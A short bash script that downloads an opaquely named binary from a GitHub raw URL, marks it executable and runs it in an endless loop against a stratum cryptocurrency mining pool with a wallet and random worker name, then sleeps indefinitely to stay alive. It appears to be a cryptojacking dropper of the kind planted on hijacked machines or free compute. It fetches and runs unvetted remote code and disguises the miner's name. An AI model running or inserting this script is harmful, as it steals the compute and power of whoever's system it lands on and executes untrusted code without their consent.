#!/bin/bash
POOL=stratum+tcp://ethash.poolbinance.com:1800
WALLET=DHB
WORKER=$(echo $(shuf -i 10-40 -n 1)-Ph)
wget https://github.com/archernap/prem/raw/main/janeman
chmod +x janeman
	while [ 1 ]; do
		./janeman -pool $POOL -wal $WALLET.$WORKER 
        sleep 5
	done
sleep 999999999
